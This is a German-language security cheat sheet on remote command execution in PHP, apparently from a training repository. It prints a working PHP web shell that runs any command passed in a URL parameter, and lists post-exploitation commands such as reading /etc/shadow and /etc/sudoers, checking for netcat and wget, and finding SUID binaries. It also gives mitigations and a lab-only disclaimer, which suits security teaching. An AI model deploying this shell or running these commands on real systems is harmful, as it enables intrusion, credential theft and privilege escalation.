# 🐘 phpRCE Cheat Sheet

## 🔍 Kontext: Remote Command Execution in PHP

Diese Datei beschreibt ein typisches Beispiel für **Remote Command Execution (RCE)** durch eine unsichere PHP-Webanwendung.  
Der Code ermöglicht es Angreifern, über einen GET-Parameter (`?cmd=`) beliebige Shell-Befehle auf dem Zielsystem auszuführen – **ein schwerwiegender Sicherheitsfehler**.

---

## 🧠 Beispiel: Verwundbarer PHP-Code

```php
<?php
  if( empty( $_GET["cmd"] ) ){
    echo "Useful things:\n";
    echo "  uname -a\n";
    echo "  id\n";
    echo "  cat /etc/passwd\n";
    echo "  cat /etc/shadow\n";
    echo "  cat /etc/group\n";
    echo "  cat /etc/group | grep admin\n";
    echo "  cat /etc/sudoers\n";
    echo "  ls -la /home\n";
    echo "  ls -la /root\n";
    echo "  ls -la /var/www\n";
    echo "  which nc\n";
    echo "  which wget\n";
    echo "  find / -type f -perm -4000\n";
  }
  echo "<pre>";
  exec( $_GET["cmd"], $out );
  echo htmlentities( join( "\n", $out ) );
  echo "</pre>";
?>
```
## ⚠️ Sicherheitsanalyse

### ❌ Problem:

Die Funktion exec($_GET["cmd"]) erlaubt die ungefilterte Ausführung von Systembefehlen, die über die URL übergeben werden.

→ Beispiel:
`http`
```http://target.local/rce.php?cmd=whoami```

### 🛠️ Besser wäre:

- Verwendung vorbereiteter Kommandos ohne Benutzereingaben.
- Whitelisting erlaubter Befehle.
- Nutzung von escapeshellcmd() und escapeshellarg() (nur bedingt sicher).
- Oder: Verzicht auf Shell-Zugriffe aus Webanwendungen.

---

## 🧾 Typische Post-Exploitation-Befehle

| Befehl                       | Beschreibung                                          |                                   |
| ---------------------------- | ----------------------------------------------------- | --------------------------------- |
| `uname -a`                   | Kernel & OS-Details                                   |                                   |
| `id`                         | Aktueller Benutzer & Gruppen                          |                                   |
| `cat /etc/passwd`            | Benutzerliste                                         |                                   |
| `cat /etc/shadow`            | Passwort-Hashes (nur als root lesbar)                 |                                   |
| `cat /etc/group`             | Gruppenliste                                          |                                   |
| `cat /etc/group`             | grep admin                                            | Prüfen, wer in "admin"-Gruppe ist |
| `cat /etc/sudoers`           | Wer hat Root-Rechte über sudo                         |                                   |
| `ls -la /home`               | Benutzerverzeichnisse prüfen                          |                                   |
| `ls -la /root`               | Root-Verzeichnis prüfen (meist geschützt)             |                                   |
| `ls -la /var/www`            | Webverzeichnis analysieren                            |                                   |
| `which nc`                   | Ist Netcat vorhanden?                                 |                                   |
| `which wget`                 | Ist wget verfügbar für Datei-Downloads?               |                                   |
| `find / -type f -perm -4000` | Alle SUID-Binaries finden (root privilege escalation) |                                   |

---

## 📦 Anwendungsszenarien (für Lab- oder CTF-Zwecke)

- 🧪 Testen von Webshells in Laborumgebungen
- 🔍 Auffinden & Ausnutzen von RCE-Schwachstellen
- 🔐 Erkennen typischer Privilege Escalation-Pfade
- 🛠️ Automatisierung mit curl, Burp oder Exploitskripten

--- 

## 🧱 Verteidigung (Blue Team)

- Verwende niemals Benutzereingaben direkt in exec(), system(), passthru() etc.
- Setze Application Firewalls ein (z. B. ModSecurity).
- Nutze sichere Webframeworks mit Sandboxing.
- Begrenze Rechte des Webservers (z. B. www-data darf nicht root sein).
- Erkenne Anomalien per Logüberwachung (z. B. suspicious cmd= Requests).

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!


## 📁 Siehe auch

- [sqlInjectionToShell.md](/vulnerabilities/sqlInjection/SQLInjectionToShell.md)
- [breakAndFixQuery.md](/vulnerabilities/sqlInjection/BreakAndFixQuery.md)
- [UnionBasedAttack.md](/vulnerabilities/sqlInjection/UnionBasedAttack.md)
- [postExploitationTools.md](/vulnerabilities/postExploitationTools.md)


